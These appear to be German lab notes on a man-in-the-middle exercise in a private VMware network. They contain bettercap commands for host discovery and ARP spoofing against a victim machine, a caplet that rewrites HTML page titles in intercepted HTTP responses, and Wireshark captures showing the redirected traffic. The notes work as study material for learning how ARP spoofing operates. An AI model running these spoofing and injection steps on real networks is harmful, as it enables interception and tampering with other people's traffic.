attacker=192.168.226.137
victim=192.168.226.138

host=192.168.226.2


sudo apt update
sudo apt install bettercap




$ sudo apt install bettercap
 liefert Fehlermeldung.
 
sudo apt install bettercap --fix-missing -y
 
das funktioniert
 
sudo bettercap

```
help
help net.probe
net.probe on
net.show
 
help net.recon
net.recon on
net.show

active
 
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.226.138
arp.spoof on

net.sniff on
```

```js
// Caplet: title_replace.cap
// Ersetzt den Titel jeder HTML-Seite (im Klartext über HTTP)

// Der neue Titel, der verwendet werden soll
var NEW_TITLE = "🚨 ManipulierT 🚨";

// Wird ausgeführt, wenn der HTTP-Proxy eine Antwort vom Server erhält
http.on('response', function(req, res) {
    // 1. Überprüfen, ob es eine Text-HTML-Antwort ist
    if (res.ContentType.indexOf('text/html') !== -1) {
        
        var body = res.Body.toString();
        
        // 2. Regulärer Ausdruck, um den alten Titel-Tag zu finden
        // Achtung: Der Ausdruck ist so gewählt, dass er nur den Inhalt des Tags ersetzt.
        // Der reguläre Ausdruck sucht nach <title>...</title>
        var titleRegex = /(<title>)(.*?)(<\/title>)/i;

        // 3. Den Titel ersetzen
        // $1 = alles vor dem alten Titel (<title>)
        // $3 = alles nach dem alten Titel (</title>)
        var newBody = body.replace(titleRegex, '$1' + NEW_TITLE + '$3');

        // 4. Den modifizierten Body zurück in die Antwort schreiben
        if (newBody !== body) {
            res.Body = newBody;
            res.ContentLength = newBody.length;
            // Optional: Logge die Modifikation für deine Konsole
            log('Titel ersetzt für Host: ' + req.Host);
        }
    }
});
```

```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.40.135
set http.proxy.caplet title_replace.js
arp.spoof on
http.proxy on
net.sniff on
```

```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.40.135
arp.spoof on
net.sniff on
```




# Wireshark



capture filters: `` 

```
nat
host 192.168.40.135
src host 192.168.40.135
```

net.show:

```
┌────────────────┬───────────────────┬─────────┬──────────────┬────────┬────────┬──────────┐
│      IP ▴      │        MAC        │  Name   │    Vendor    │  Sent  │ Recvd  │   Seen   │
├────────────────┼───────────────────┼─────────┼──────────────┼────────┼────────┼──────────┤
│ 192.168.40.128 │ 00:0c:29:3b:8d:3e │ eth0    │ VMware, Inc. │ 0 B    │ 0 B    │ 04:44:16 │
│ 192.168.40.2   │ 00:50:56:ef:e8:4e │ gateway │ VMware, Inc. │ 1.0 kB │ 1.0 kB │ 04:44:16 │
│                │                   │         │              │        │        │          │
│ 192.168.40.1   │ 00:50:56:c0:00:08 │         │ VMware, Inc. │ 0 B    │ 460 B  │ 04:44:28 │
│ 192.168.40.135 │ 00:0c:29:00:61:1d │         │ VMware, Inc. │ 4.9 kB │ 4.8 kB │ 04:44:58 │
│ 192.168.40.254 │ 00:50:56:fa:2b:d8 │         │ VMware, Inc. │ 0 B    │ 368 B  │ 04:44:30 │
└────────────────┴───────────────────┴─────────┴──────────────┴────────┴────────┴──────────┘

```

Wireshark Aufzeichnungen

HTTP GET Request

```
Ethernet II, Src: VMware_00:61:1d (00:0c:29:00:61:1d), Dst: VMware_ef:e8:4e (00:50:56:ef:e8:4e)
Internet Protocol Version 4, Src: 192.168.40.135, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 56646, Dst Port: 80, Seq: 730, Ack: 2848, Len: 371
Hypertext Transfer Protocol
```
Ethernet Dst ist das Gateway, so wie es sein soll.

---

Aufzeichung nach aktiviertem ARP Spoofing:

```
Frame 9: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface eth0, id 0
Ethernet II, Src: VMware_00:61:1d (00:0c:29:00:61:1d), Dst: VMware_3b:8d:3e (00:0c:29:3b:8d:3e)
Internet Protocol Version 4, Src: 192.168.40.135, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 36752, Dst Port: 80, Seq: 0, Len: 0
```

Das Ziel ist jetzt die MAC Adresse des Attackers, nicht mehr der Router.

Am Wireshark sieht der Traffic jetzt ganz anders aus, es werden auch viele Fehler (Retransmissions) angezeigt.





